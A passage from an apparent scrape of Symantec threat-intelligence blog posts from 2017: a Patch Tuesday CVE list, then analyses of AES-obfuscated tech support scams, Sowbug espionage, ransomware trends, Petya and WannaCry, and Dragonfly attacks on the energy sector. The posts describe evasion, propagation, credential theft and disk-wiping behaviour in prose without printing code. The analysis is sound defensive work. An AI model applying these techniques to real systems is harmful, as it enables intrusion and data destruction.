Microsoft Office Memory Corruption Vulnerability(CVE-2017-11882)MS Rating: Important Microsoft Office Memory Corruption Vulnerability(CVE-2017-11884)MS Rating: Important Microsoft Project Server Elevation of Privilege Vulnerability(CVE-2017-11876)MS Rating: Moderate Cumulative Security Update for Microsoft ASP.NET ASP.NET CORE Denial Of Service Vulnerability(CVE-2017-11770)MS Rating: Important ASP.NET Core Elevation Of Privilege Vulnerability(CVE-2017-11879)MS Rating: Important ASP.NET Core information disclosure Vulnerability(CVE-2017-11883)MS Rating: Important ASP.NET Core information disclosure Vulnerability(CVE-2017-8700)MS Rating: Moderate Cumulative Security Update for Microsoft Windows Kernel Windows Kernel information disclosure Vulnerability(CVE-2017-11842)MS Rating: Important Windows Kernel Elevation of Privilege Vulnerability(CVE-2017-11847)MS Rating: Important Windows Kernel information disclosure Vulnerability(CVE-2017-11849)MS Rating: Important Windows Kernel information disclosure Vulnerability(CVE-2017-11851)MS Rating: Important Windows Kernel information disclosure Vulnerability(CVE-2017-11853)MS Rating: Important Windows Kernel information disclosure Vulnerability(CVE-2017-11831)MS Rating: Important Windows Kernel information disclosure Vulnerability(CVE-2017-11880)MS Rating: Important Cumulative Security Update for Microsoft Windows Graphics Component Microsoft Graphics Component information disclosure Vulnerability(CVE-2017-11850)MS Rating: Important Windows GDI information disclosure Vulnerability(CVE-2017-11852)MS Rating: Important Cumulative Security Update for Microsoft Windows Media Player Windows Media Player information disclosure Vulnerability(CVE-2017-11768)MS Rating: Important Cumulative Security Update for Microsoft Windows Windows EOT Font Engine information disclosure Vulnerability(CVE-2017-11832)MS Rating: Important Windows EOT Font Engine information disclosure Vulnerability(CVE-2017-11835)MS Rating: Important Windows Search Denial of Service Vulnerability(CVE-2017-11788)MS Rating: Important Device Guard security bypass Vulnerability(CVE-2017-11830)MS Rating: Important More information is available on Symantec's freeSecurity Centerportal and to our customers through the DeepSight Threat Management System. Himanshu is a senior member of Symantec's Cyber Security Services organization. An active contributor to numerous security communities, he frequently provides insight on vulnerabilities and shares his knowledge by writing reports, blogs, and journals. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/ms-patch-tuesday-november-2017"
  },
  {
    "title": "tech support scams aes",
    "content": "In my lastpost, I discussed the evolution of tech support scams and their growing penchant towards the use of code obfuscation to hide their malicious activity behind heaps of obfuscated JavaScript code. This growing trend was an endeavor, undertaken with a single and simple objective in mind: to avoid detection by string-based detection engines employed by various security vendors. This allowed the attackers behind these fake scams to remain under the radar and still be as effective as ever. Since then, a year has passed and a lot of water has flowed under the bridge. The threat landscape has witnessed a lot of significant changes, some of which include the introduction ofJavaScript-based coin miners, malware (in particular ransomware)exploiting vulnerabilities in Microsoft’s implementation of the Server Message Block(SMB) protocol to spread, and the continuing decline in exploit kit activity. But where do tech support scams stand in today’s threat landscape? As it turns out, tech support scams have got meaner, adding new anti-detection techniques to their arsenal. Over the past year, there has been a growing trend towards so-called “living off the land” tactics, which involves attackers using tools and technologies already installed on target computers. The main benefits behind using this approach are twofold: the attacker can target a larger pool of victims (as most of the users have these tools installed by default or use these technologies frequently), and at the same time keep a low profile (as these tools are not inherently malicious, using them is unlikely to trigger any alarms). In this blog post, I will describe how tech support scams have embraced this approach by making use of the Advanced Encryption Standard (AES) specification algorithm to obfuscate their scam content. Advanced Encryption Standard orAESis an encryption algorithm used to encrypt sensitive electronic data so as to protect it from unintended third-party use while the data is stored or is in transit. AES is fast in both software and hardware and is the first (and only) publicly accessible algorithm approved by the National Security Agency (NSA). Now tech support scams are following the trend and are using the AES encryption algorithm as an anti-detection mechanism. While I’m not going to deep dive into the intricacies of this algorithm, the fact that it allows for strong data encryption, and is in widespread use around the world to secure sensitive data, makes it an ideal candidate for living off the land attacks. We have already witnessed this algorithm being used in various ransomware threats, such as TorrentLocker (Ransom.TorrentLocker) and TeslaCrypt (Trojan.Cryptolocker.N), and in other attacks such as in phishing kits. Now tech support scams are following the trend and are using the AES encryption algorithm as an anti-detection mechanism. The scam is initiated when an unsuspecting user visits a malicious website or is redirected to one by various means such as a malvertisement or compromised website. The scam web page informs the victim that the license key file has been deleted from the computer due to a malware infection and tries to lure the user into calling a “Toll free” number for assistance. An audio file, stating that the computer is infected, is also played in the background when the user arrives on the scam web page. A first look through the source code for the scam web page reveals the piece of code responsible for playing the audio. After that we come across some interesting pieces of JavaScript code. The first piece of code loads a file named aes.js, which is actually a library code implementation of the AES algorithm. As is the usual practice with software code development, this library is then used to decrypt AES obfuscated content on the fly, as we will see later. The second piece of code contains two JavaScript functions. The first function takes AES encrypted hexadecimal content as input and uses a predefined hardcoded encryption key. The function proceeds as follows: The code in Figure.2 is a sample from the AES library which is used for this decryption process. The second JavaScript function works in a similar fashion except for a minor difference in the input format. The function takes a HTML DOM element as input, from which it then extracts the encrypted HTML content. The function then proceeds to decrypt this content, similar to the earlier function, and then replaces the encrypted HTML content in the DOM element with the decrypted content which is then presented to the user. Moving forward, the scammers use the first function repeatedly by feeding it with pre-calculated encrypted hexadecimal content, to decode it on the fly into the scam messages, which are then presented to victims. A sample block of code can be seen in Figure.3. The code seen in Figure.3 decodes into the sample seen in Figure.4. This is essentially what is visible to victims when they land on the scam web page. The scam page also has JavaScript code to look out for certain keyboard key presses. Any attempt to press ESC, F11, or the Ctrl+Alt+Delete combination is thwarted by the web page going full screen, making the scenario more alarming for the user. While this tech support scam does, to a certain extent, manage to avoid detection, it fails in other aspects. For example, by using hardcoded values such as, for example, the operating system that the victim is supposedly using (hardcoded value is Windows 7), there is a risk that users will figure out it’s a scam. Considering these types of scams are usually tailored to each victim, it’s a likely assumption that this is still a work in progress and the scammers could well add more features in the future. Even though the threat landscape has evolved a great deal in the year sincemy last tech support scam blog, these scams have continued to persist and keep generating revenue for the criminals behind them. Tech support scams have also started integrating JavaScript-based cryptocurrency miners into their web pages, which serves a dual purpose in the sense that cryptocurrency can be mined using the victim’s CPU power and, as the computer’s performance becomes sluggish due to mining, it also makes the victim believe that their computer really is infected. These new techniques employed by criminals demonstrate that this type of scam is continuing to evolve and that there is still plenty of money to be made, as such I think it is safe to assume that tech support scams are here to stay. At Symantec, we provide a variety of products to protect our customers. Our Intrusion Prevention System (IPS) security component proactively protects customers from tech support scams by blocking the malicious network activity associated with such scams using a wide variety of detections. The scam is thus blocked even before it reaches the end user. Our IPS telemetry for this year shows that the countries targeted the most by tech support scams were the U.S., UK, Canada, Australia, and Japan. Norton Security, Symantec Endpoint Protection, and many other Symantec security products have comprehensive network-based protection features such as firewall and IPS built in. To protect yourself from these types of scams, ensure that none of these features are turned off. Also make sure you visit legitimate websites when you need support for any product. If you notice any piracy related to our products, please feel free to contact ushere. Last but not the least, make sure your antivirus product is updated regularly. More information on tech support scams is availablehere. Siddhesh works for the Intrusion Prevention System (IPS) team in Symantec's Security Technology and Response (STAR) division. He analyzes and creates IPS protection for various network-based threats such as exploit kits and tech support scams. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/tech-support-scams-aes"
  },
  {
    "title": "sowbug cyber espionage south america asia",
    "content": "Symantec has identified a previously unknown group called Sowbug that has been conducting highly targeted cyber attacks against organizations in South America and Southeast Asia and appears to be heavily focused on foreign policy institutions and diplomatic targets. Sowbug has been seen mounting classic espionage attacks by stealing documents from the organizations it infiltrates. Symantec saw the first evidence of Sowbug-related activity with the discovery in March 2017 of an entirely new piece of malware called Felismus used against a target in Southeast Asia.  We have subsequently identified further victims on both sides of the Pacific Ocean. While the Felismus tool was first identified in March of this year, its association with Sowbug was unknown until now. Symantec has also been able to connect earlier attack campaigns with Sowbug, demonstrating that it has been active since at least early-2015 and may have been operating even earlier. To date, Sowbug appears to be focused mainly on government entities in South America and Southeast Asia and has infiltrated organizations in Argentina, Brazil, Ecuador, Peru, Brunei and Malaysia. The group is well resourced, capable of infiltrating multiple targets simultaneously and will often operate outside the working hours of targeted organizations in order to maintain a low profile. Some clues about the motivation and interests of the attackers can be found in their activities after compromising victims. For example, in a 2015 attack on one South American foreign ministry, the group appeared to be searching for very specific information. The first evidence of its intrusion dated from May 6, 2015 but activity appeared to have begun in earnest on May 12. The attackers appeared to be interested in one division of the ministry that is responsible for relations with the Asia-Pacific region. They attempted to extract all Word documents stored on a file server belonging to this division by bundling them into a RAR archive by running the following command: Interestingly, the command specified that only files modified from May 11, 2015 onwards should be archived. The attackers appear to have successfully extracted the archive because an hour later they returned, this time attempting to extract all documents modified from May 7, 2015, an extra four days’ worth of data. Presumably they either didn't find what they were looking for in the initial incursion, or else noticed something in the documents they stole earlier that prompted them to hunt for more information. The attackers didn’t stop there. Their next move was to list any remote shared drives and then attempt to access remote shares owned by the specific government office they were targeting, again attempting to extract all Word documents. In this case, they searched for any documents modified from May 9 onwards. The attackers then seemed to broaden their interest, listing the contents of various directories on remote shares, including one belonging to another division of the South American foreign ministry, this one responsible for relations with international organizations. They also deployed two unknown payloads to the infected server. In total, the attackers maintained a presence on the target’s network for four months between May and September 2015. Sowbug frequently maintains a long-term presence on the networks of targeted organizations, sometimes remaining inside a victim environment for up to six months. One of the tactics it uses to avoid drawing attention to itself is impersonating commonly used software packages such as Windows or Adobe Reader. It has never attempted to compromise the software itself. Rather, it gives its tools file names similar to those used by the software and places them in directory trees that could be mistaken for those used by the legitimate software. This allows the attackers to hide in plain sight, as their appearance in process listings is unlikely to arouse suspicion. For example, in September 2016, Sowbug infiltrated an organization in Asia, deploying the Felismus backdoor on one of its computers, Computer A, using the file name adobecms.exe in CSIDL_WINDOWS\\debug. From there, it installed additional components and tools to a directory named CSIDL_APPDATA\\microsoft\\security. The attackers then began to perform reconnaissance activities on Computer A via cmd.exe, collecting system-related information, such as the OS version, hardware configuration, and network information. They then performed some further reconnaissance, attempting to identify all installed applications on the computer. They returned four days later, creating a sub-directory called “common” in the Adobe directory of the Program Files folder, i.e. c:\\Program Files\\Adobe\\common, and installed another tool in this sub-directory,  again named adobecms.exe.  This was possibly an updated version of the backdoor. The attackers’ network reconnaissance appeared to be successful because a second computer of interest in the organization was identified and compromised. The attackers then returned to Computer A, installing another executable called fb.exe. This file appears to be used to copy Felismus across the network to other computers and there is evidence that the attackers used it to attempt to infect at least two more computers. The attackers took further measures to remain under the radar by carrying out their operations outside of standard office hours. In this case, the attackers maintained a presence on the target’s network for nearly six months between September 2016 and March 2017. How Sowbug performs its initial infiltration of a target’s network remains unknown. In some cases, there was no trace of how Felismus made its way onto compromised computers, meaning it was likely deployed from other compromised computers on the network. In other attacks, there was evidence that Felismus was installed using a tool known as Starloader (detected by Symantec as Trojan.Starloader). This is a loader that installs and decrypts data from a file called Stars.jpg. Additionally, Starloader was also observed deploying additional tools used by the attackers, such as credential dumpers and keyloggers. It is still unknown how Starloader is installed on the compromised computer. One possibility is that the attackers use fake software updates to install files. Symantec has found evidence of Starloader files being named AdobeUpdate.exe, AcrobatUpdate.exe, and INTELUPDATE.EXE among others. These were used to create versions of the Felismus backdoor as well as other tools. While cyber espionage attacks are often seen against targets in the U.S., Europe, and Asia, it is much less common to see South American countries targeted. However, the number of active cyber espionage operations has increased steadily in recent years and the emergence of Sowbug is a reminder that no region is immune to this kind of threat. Symantec customers are protected against Sowbug and Symantec has also made efforts to notify identified targets of its operations. Customers with Intelligence Services or WebFilter-enabled products are protected against activity associated with the Sowbug group. These products include: Symantec has the following specific detections in place for the threats called out in this blog: Backdoor.Felismus samples MD5                                                              Detection Trojan.Starloader samples MD5                                                                Detection 4984e9e1a5d595c079cc490a22d67490            Trojan.Starloader MD5                                                                 Detection e4e1c98feac9356dbfcac1d8c362ab22                Hacktool.Mimikatz Installation directory Command and control infrastructure The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/sowbug-cyber-espionage-south-america-asia"
  },
  {
    "title": "ransomeware risks 2017",
    "content": "While ransomware has long been one of the main cyber threats to businesses, the past number of months have seen organizations more exposed than ever.Symantec’s latest research paper on ransomwarehas found that businesses were the main victims of theWannaCryandPetyaoutbreaks, with corporate networks the ideal breeding ground for this new generation of self-propagating threats. Our research found that overall ransomware infection numbers have continued to trend upwards.  During the first six months of 2017, Symantec blocked just over 319,000 ransomware infections. If this infection rate continued for the full year, 2017 would be a significant increase over 2016, when a total of 470,000 infections were blocked. Contributing to this increase was a spike in blocked infections during May and June 2017, the months when the WannaCry and Petya outbreaks occurred. This year saw the arrival of a new generation of self-propagating ransomware. WannaCry, which was the first to appear, caused global panic due to its ability to spread itself across the networks of infected organizations and then spread to other organizations across the internet. Petya mimicked some of the techniques employed by WannaCry to spread itself across networks. What enabled WannaCry to spread so quickly was that its developers had incorporated the leaked “EternalBlue” exploit into its code. An exploit of a vulnerability in the Windows implementation of the Server Message Block (SMB) protocol (CVE-2017-0144), it had been patched two months earlier, but there were still enough unpatched computers online for WannaCry to spread quickly. EternalBlue allowed WannaCry to act like a worm, spreading itself to other unpatched computers on the local network and across the internet by scanning random IP addresses in an attempt to find other vulnerable computers. Six weeks later, a new variant of Petya adopted similar tactics, using EternalBlue as a propagation mechanism, but also incorporating other SMB network spreading techniques, which meant it could spread within organizations to computers that had been patched against EternalBlue. Another difference from WannaCry was that Petya was far more targeted, configured to mainly affect organizations in Ukraine, although other organizations in other countries were also affected. The impact of WannaCry and Petya makes it quite likely that more attackers will attempt to replicate the tactics used by deploying ransomware as a worm. The propagation mechanisms employed by both ransomware families enabled the threats to spread quickly across an entire computer network. Many consumer computers are not connected to a network, unlike those found in organizations. While WannaCry and Petya also did have the ability to spread across the internet to other vulnerable computers, this means of transmission again largely affected other organizations. Most home internet routers would have blocked infection attempts involving the EternalBlue exploit. WannaCry and Petya’s disproportionate impact on organizations can be seen in infection statistics. During 2015 and 2016, businesses accounted for between 29 and 30 percent of ransomware infections. That figure shot up to 42 percent in the first half of 2017, with a major spike in business infections during May and June, the months WannaCry and Petya spread. Organizations need to prepare themselves for the threat posed by self-propagating ransomware. The Petya outbreak demonstrated that even without EternalBlue, attackers can create worm-like ransomware that is capable of spreading across a network. While it does require more skill and the use of additional tools, such as credential stealers, the potential rewards are much greater. During the first six months of 2017, the average ransom demand seen in new ransomware families was US$544. This follows on from a period of rapid inflation in ransom demands. During 2016, the average ransom demand seen in new ransomware families increased dramatically, rising more than threefold from $294 to $1,077. This could suggest that after a period of trial-and-error in 2016, many attackers have settled on a ransom demand of around $500 as the “sweet spot” for ransom demands. While this may not sound like a major loss for an organization, most ransom demands are for a single infected computer. If an organization finds itself with tens or hundreds of infected computers, the price demanded by attackers will quickly add up. WannaCry and Petya proved that ransomware is not a predictable threat and organizations who are complacent may be caught out. Building a multi-layered defense ensures that any point of failure is mitigated by other defensive practices. This should include not only regularly patching vulnerabilities and ensuring critical systems are backed up, but also employing multiple, overlapping, and mutually supportive defensive systems to guard against single-point failures in any specific technology or protection method. Adopting a multi-layered approach to security minimizes the chance of infection. Symantec has a comprehensive strategy that protects against ransomware in three stages. For an in-depth look at the threat posed by ransomware and to learn more about Symantec’s ransomware protection strategy please see our whitepaper:Ransomware 2017: An ISTR special report Dick O’Brien works for the Symantec Threat Hunter Team, where he helps develop, edit, and write research into new and emerging threats. Prior to joining Symantec, he worked for 13 years as a newspaper reporter, where he specialized in business and technology. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/ransomeware-risks-2017"
  },
  {
    "title": "petya ransomware wiper",
    "content": "A new strain of the Petya ransomware started propagating on June 27, 2017, infecting many organizations. Similar toWannaCry, Petya uses the EternalBlue exploit as one of the means to propagate itself. However, it also uses classic SMB network spreading techniques, meaning that it can spread within organizations, even if they have patched against EternalBlue. Symantec has confirmed that MEDoc, a tax and accounting software package, is used for the initial insertion of Petya into corporate networks. MEDoc is widely used in Ukraine, indicating that organizations in that country were the primary target. After gaining an initial foothold, Petya then uses a variety of methods to spread across corporate networks. Petya is a worm, meaning it has the ability to self-propagate. It does this by building a list of target computers and using two methods to spread to those computers. Petya builds a list of IP addresses to spread to, which includes primarily addresses on the local area network (LAN) but also remote IPs. The full list is built as follows: Once the list of target computers has been identified, Petya builds out a list of user names and passwords it can use to spread to those targets. The list of user names and passwords is stored in memory. It uses two methods to gather credentials: Petya uses two primary methods to spread across networks: Petya checks for the presence of the following processes which are used by Norton products and Symantec Endpoint Protection: If found, Petya will not use the EternalBlue and EternalRomance exploits to spread. Petya is initially executed via rundll32.exe using the following command: Once the DLL has been loaded, it will first attempt to remove itself from the infected system. This is done by opening the file and overwriting its contents with null bytes before finally deleting the file from disk. Overwriting the file with null bytes is used as an attempt to thwart recovery of the file using forensic techniques. Next, it attempts to create the following file to be used as a flag indicating that the computer has been infected: Once installed, Petya proceeds to modify the master boot record (MBR). This allows it to hijack the normal loading process of the infected computer during the next system reboot. The modified MBR is used to encrypt the hard disk while simulating a CHKDSK screen. It then displays a ransom note to the user. MBR modification does not succeed if the threat is executed as a normal user but the threat will still attempt to spread across the network At this point, a system reboot is scheduled using the following command: By scheduling and not forcing a reboot, it provides time to allow Petya to spread to other computers in the network before user-mode encryption occurs. Petya performs encryption in two ways: Once spreading has occurred, Petya then lists all files on any fixed drive (e.g. C:\\) and checks for any of the following file extensions (skipping the%Windir%directory of that drive): .3ds .7z .accdb .ai .asp .aspx .avhd .back .bak .c .cfg .conf .cpp .cs .ctl .dbf .disk .djvu .doc .docx .dwg .eml .fdb .gz .h. hdd .kdbx .mail .mdb .msg .nrg .ora .ost .ova .ovf .pdf .php .pmf .ppt .pptx .pst .pvi .py .pyc .rar .rtf .sln .sql .tar .vbox .vbs .vcb .vdi .vfd .vmc .vmdk .vmsd .vmx .vsdx .vsv .work .xls .xlsx .xvd .zip If any of the file extensions match that of the file list, encryption occurs. As mentioned, encryption performed by Petya is twofold; firstly specific file types are encrypted in user-mode after spreading occurs and the key is encrypted with an embedded public key, Base64 encoded, and appended to the README.TXT file. After a system reboot occurs, the infected MBR is loaded, disk encryption begins, and the ransom note is displayed to the user. The \"installation key\" referenced in the ransom note is a randomly generated string that is displayed to the user. A randomly generated Salsa20 key is then used for disk encryption. As there is no relationship between the “installation key” and Salsa20 key, the disk can never be decrypted. This demonstrates that Petya is more accurately a wiper rather than ransomware. Symantec Endpoint Protection (SEP) and Norton products proactively protect customers against attempts to spread Petya using EternalBlue. SONAR behavior detection technology also proactively protects against Petya infections. Symantec products using definitions version 20170627.009 also detect Petya components asRansom.Petya. Petya has been in existence since 2016. It differs from typical ransomware as it doesn’t just encrypt files, it also overwrites and encrypts the master boot record (MBR). In this latest attack, the following ransom note is displayed on infected computers, demanding that $300 in bitcoins be paid to recover files: The MEDoc accounting software is used to drop and install Petya into organizations’ networks. Once in the network it uses two methods to spread. One of the ways in which Petya propagates itself is by exploiting theMS17-010vulnerability, also known as EternalBlue. It also spreads by acquiring user names and passwords and spreading across network shares. Petya is primarily impacting organizations in Europe. It is unclear at this time, however, the initial infector is software used solely in Ukraine, indicating that organizations there were the initial targets. Symantec recommends that users do not pay the ransom, particularly as there is no evidence that files will be restored. Symantec has the following IPS protection in place to protect customers against these attacks: For further detail seehttps://email.status.symantec.com/ Symantec is continuing to analyze this threat and will post further information as soon as it becomes available. Symantec's Security Response organization develops and deploys new security content to Symantec customers. Our team of global threat analysts operate 24x7 to track developments on the threat landscape and protect Symantec customers. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/petya-ransomware-wiper"
  },
  {
    "title": "wannacry ransomware attack",
    "content": "Symantec has uncovered further links to more closely tie the WannaCry attacks with the Lazarus group. For further details, see:WannaCry: Ransomware attacks show strong links to Lazarus group Symantec has uncovered two possible links that loosely tie the WannaCry ransomware attack and the Lazarus group: While these findings do not indicate a definitive link between Lazarus and WannaCry, we believe that there are sufficient connections to warrant further investigation. We will continue to share further details of our research as it unfolds. A virulent new strain of ransomware known as WannaCry (Ransom.Wannacry) has hit hundreds of thousands of computers worldwide since its emergence on Friday, May 12. WannaCry is far more dangerous than other common ransomware types because of its ability to spread itself across an organization’s network by exploiting critical vulnerabilities in Windows computers, which were patched by Microsoft in March 2017 (MS17-010). The exploit, known as “Eternal Blue,” was released online in April in the latest of aseries of leaks by a group known as the Shadow Brokers, who claimed that it had stolen the data from the Equation cyber espionage group. Symantec Endpoint Protection (SEP) and Norton have proactively blocked any attempt to exploit the vulnerabilities used by WannaCry, meaning customers were fully protected before WannaCry first appeared. SEP14 Advanced Machine Learning proactively blocked all WannaCry infections on day zero, without any updates. The Blue Coat Global Intelligence Network (GIN) provides automatic detection to all enabled products for web-based infection attempts. Symantec and Norton customers are automatically protected against WannaCry using a combination of technologies. Proactive protection was provided by: Customers should have these technologies enabled for full proactive protection. SEP customers are advised to migrate to SEP 14 to take advantage of the proactive protection provided by Advanced Machine Learning signatures. WannaCry searches for and encrypts 176 different file types and appends .WCRY to the end of the file name. It asks users to pay a US$300 ransom in bitcoins. The ransom note indicates that the payment amount will be doubled after three days. If payment is not made after seven days it claims the encrypted files will be deleted. However Symantec has not found any code within the ransomware which would cause files to be deleted. Decryption of encrypted files is not possible at present but Symantec researchers continue to investigate the possibility. Seethis articlefor further details. If you have backup copies of affected files, you may be able to restore them. Symantec does not recommend paying the ransom. In some cases, files may be recovered without backups. Files saved on the Desktop, My Documents, or on a removable drive are encrypted and their original copies are wiped. These are not recoverable. Files stored elsewhere on a computer are encrypted and their original copies are simply deleted. This means they could be recovered using an undelete tool. WannaCry first appeared on Friday, May 12. Symantec saw a dramatic upsurge in the number of attempts to exploit the Windows vulnerabilities used by WannaCry from approximately 8:00 GMT onwards. The number of exploit attempts blocked by Symantec dropped slightly on Saturday and Sunday but remained quite high. Exploit numbers increased on Monday, presumably as people returned to work after the weekend. Any unpatched Windows computer is potentially susceptible to WannaCry. Organizations are particularly at risk because of its ability to spread across networks and a number of organizations globally have been affected, the majority of which are in Europe. However individuals can also be affected. Current WannaCry activity is not believed to be part of a targeted attack. WannaCry has the ability to spread itself within corporate networks without user interaction, by exploiting known vulnerabilities in Microsoft Windows. Computers that do not have the latest Windows security updates applied are at risk of infection. While WannaCry can spread itself across an organization’s networks by exploiting a vulnerability, the initial means of infection—how the first computer in an organization is infected—remains unconfirmed. Symantec has seen some cases of WannaCry being hosted on malicious websites, but these appear to be copycat attacks, unrelated to the original attacks. The WannaCry attackers request that the ransom be paid using Bitcoins. WannacCy generates a unique Bitcoin wallet address for each infected computer, however due to a race condition bug this code does not execute correctly. WannaCry then defaults to three hardcoded Bitcoin addresses for payment. The attackers are unable to identify which victims have paid using the hardcoded addresses, meaning that victims are unlikely to get their files decrypted. The WannaCry attackers subsequently released a new version of the malware that corrected this flaw, however this version was not as successful as the original. On May 18, a new notice was displayed on infected computers informing victims that files will be decrypted if the ransom is paid. Network-based protectionSymantec has the following IPS protection in place to block attempts to exploit the MS17-010 vulnerability: SONAR behavior detection technology Advanced Machine Learning For expanded protection and identification purposes, the following Antivirus signatures have been updated: Customers should run LiveUpdate and verify that they have the following definition versions or later installed in order to ensure they have the most up-to-date protection: The following IPS signature also blocks activity related to Ransom.Wannacry: Organizations should also ensure that they have the latest Windows security updates installed, in particularMS17-010to prevent spreading. Symantec's Security Response organization develops and deploys new security content to Symantec customers. Our team of global threat analysts operate 24x7 to track developments on the threat landscape and protect Symantec customers. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/wannacry-ransomware-attack"
  },
  {
    "title": "dragonfly energy sector cyber attacks",
    "content": "The energy sector in Europe and North America is being targeted by a new wave ofcyber attacksthat could provide attackers with the means to severely disrupt affected operations. The group behind these attacks is known as Dragonfly. The group has been in operation since at least 2011 but has re-emerged over the past two years from a quiet periodfollowing exposure by Symantecand a number of other researchers in 2014. This “Dragonfly 2.0” campaign, which appears to have begun in late 2015, shares tactics and tools used in earlier campaigns by the group. The energy sector has become an area of increased interest to cyber attackers over the past two years. Most notably,disruptions to Ukraine’s power systemin 2015 and 2016 were attributed to a cyber attack and led to power outages affecting hundreds of thousands of people. In recent months, there have also been media reports ofattempted attacks on the electricity gridsin some European countries, as well as reports ofcompanies that manage nuclear facilities in the U.S. being compromisedby hackers. The Dragonfly group appears to be interested in both learning how energy facilities operate and also gaining access to operational systems themselves, to the extent that the group now potentially has the ability to sabotage or gain control of these systems should it decide to do so. Symantec customers are protected against the activities of the Dragonfly group. Symantec has evidence indicating that the Dragonfly 2.0 campaign has been underway since at least December 2015 and has identified a distinct increase in activity in 2017. Symantec has strong indications of attacker activity in organizations in the U.S., Turkey, and Switzerland, with traces of activity in organizations outside of these countries. The U.S. and Turkey were also among the countries targeted by Dragonfly in its earlier campaign, though the focus on organizations in Turkey does appear to have increased dramatically in this more recent campaign. As it did in its prior campaign between 2011 and 2014, Dragonfly 2.0 uses a variety of infection vectors in an effort to gain access to a victim’s network, including malicious emails, watering hole attacks, and Trojanized software. The earliest activity identified by Symantec in this renewed campaign was a malicious email campaign that sent emails disguised as an invitation to a New Year’s Eve party to targets in the energy sector in December 2015. The group conducted further targeted malicious email campaigns during 2016 and into 2017. The emails contained very specific content related to the energy sector, as well as some related to general business concerns. Once opened, the attached malicious document would attempt to leak victims’ network credentials to a server outside of the targeted organization. In July, Cisco blogged aboutemail-based attacks targeting the energy sector using a toolkit called Phishery.Some of the emails sent in 2017 that were observed by Symantec were also using the Phishery toolkit (Trojan.Phisherly), to steal victims’ credentials via a template injection attack. This toolkit became generally available on GitHub in late 2016, As well as sending malicious emails, the attackers also used watering hole attacks to harvest network credentials, by compromising websites that were likely to be visited by those involved in the energy sector. The stolen credentials were then used in follow-up attacks against the target organizations. In one instance, after a victim visited one of the compromised servers,Backdoor.Goodorwas installed on their machine via PowerShell 11 days later. Backdoor.Goodor provides the attackers with remote access to the victim’s machine. In2014, Symantec observed the Dragonfly group compromise legitimate software in order to deliver malware to victims, a practice also employed in the earlier 2011 campaigns. In the 2016 and 2017 campaigns the group is using the evasion framework Shellter in order to develop Trojanized applications. In particular,Backdoor.Dorshelwas delivered as a trojanized version of standard Windows applications. Symantec also has evidence to suggest that files masquerading as Flash updates may be used to install malicious backdoors onto target networks—perhaps by using social engineering to convince a victim they needed to download an update for their Flash player. Shortly after visiting specific URLs, a file named “install_flash_player.exe” was seen on victim computers, followed shortly by theTrojan.Karagany.Bbackdoor. Typically, the attackers will install one or two backdoors onto victim computers to give them remote access and allow them to install additional tools if necessary. Goodor, Karagany.B, and Dorshel are examples of backdoors used, along withTrojan.Heriplor. There are a number of indicators linking recent activity with earlier Dragonfly campaigns. In particular, the Heriplor and Karagany Trojans used in Dragonfly 2.0 were both also used in the earlier Dragonfly campaigns between 2011 and 2014. Trojan.Heriplor is a backdoor that appears to be exclusively used by Dragonfly, and is one of the strongest indications that the group that targeted the western energy sector between 2011 and 2014 is the same group that is behind the more recent attacks. This custom malware is not available on the black market, and has not been observed being used by any other known attack groups. It has only ever been seen being used in attacks against targets in the energy sector. Trojan.Karagany.B is an evolution ofTrojan.Karagany, which was previously used by Dragonfly, and there are similarities in the commands, encryption, and code routines used by the two Trojans. Trojan.Karagny.B doesn’t appear to be widely available, and has been consistently observed being used in attacks against the energy sector. However, the earlier Trojan.Karagany was leaked on underground markets, so its use by Dragonfly is not necessarily exclusive. Sabotage attacks are typically preceded by an intelligence-gathering phase where attackers collect information about target networks and systems and acquire credentials that will be used in later campaigns. The most notable examples of this are Stuxnet and Shamoon, where previously stolen credentials were subsequently used to administer their destructive payloads. The original Dragonfly campaigns now appear to have been a more exploratory phase where the attackers were simply trying to gain access to the networks of targeted organizations. The Dragonfly 2.0 campaigns show how the attackers may be entering into a new phase, with recent campaigns potentially providing them with access to operational systems, access that could be used for more disruptive purposes in future. The most concerning evidence of this is in their use of screen captures. In one particular instance the attackers used a clear format for naming the screen capture files, [machine description and location].[organization name]. The string “cntrl” (control) is used in many of the machine descriptions, possibly indicating that these machines have access to operational systems. While Symantec cannot definitively determine Dragonfly’s origins, this is clearly an accomplished attack group. It is capable of compromising targeted organizations through a variety of methods; can steal credentials to traverse targeted networks; and has a range of malware tools available to it, some of which appear to have been custom developed. Dragonfly is a highly focused group, carrying out targeted attacks on energy sector targets since at least 2011, with a renewed ramping up of activity observed in the last year. Some of the group’s activity appears to be aimed at making it more difficult to determine who precisely is behind it: Conflicting evidence and what appear to be attempts at misattribution make it difficult to definitively state where this attack group is based or who is behind it. What is clear is that Dragonfly is a highly experienced threat actor, capable of compromising numerous organizations, stealing information, and gaining access to key systems. What it plans to do with all this intelligence has yet to become clear, but its capabilities do extend to materially disrupting targeted organizations should it choose to do so. Symantec customers are protected against Dragonfly activity, Symantec has also made efforts to notify identified targets of recent Dragonfly activity. Symantec has the following specific detections in place for the threats called out in this blog: Symantec has also developed a list of Indicators of Compromise to assist in identifying Dragonfly activity: Customers of the DeepSight Intelligence Managed Adversary and Threat Intelligence (MATI) service have previously received reporting on the Dragonfly 2.0 group, which included methods of detecting and thwarting the activities of this adversary. Dragonfly relies heavily on stolen credentials to compromise a network. Important passwords, such as those with high privileges, should be at least 8-10 characters long (and preferably longer) and include a mixture of letters and numbers. Encourage users to avoid reusing the same passwords on multiple websites and sharing passwords with others should be forbidden. Delete unused credentials and profiles and limit the number of administrative-level profiles created. Employ two-factor authentication (such asSymantec VIP) to provide an additional layer of security, preventing any stolen credentials from being used by attackers. Emphasize multiple, overlapping, and mutually supportive defensive systems to guard against single point failures in any specific technology or protection method. This should include the deployment of regularly updated firewalls as well as gateway antivirus, intrusion detection or protection systems (IPS), website vulnerability with malware protection, and web security gateway solutions throughout the network. Implement and enforce a security policy whereby any sensitive data is encrypted at rest and in transit. Ensure that customer data is encrypted as well. This can help mitigate the damage of 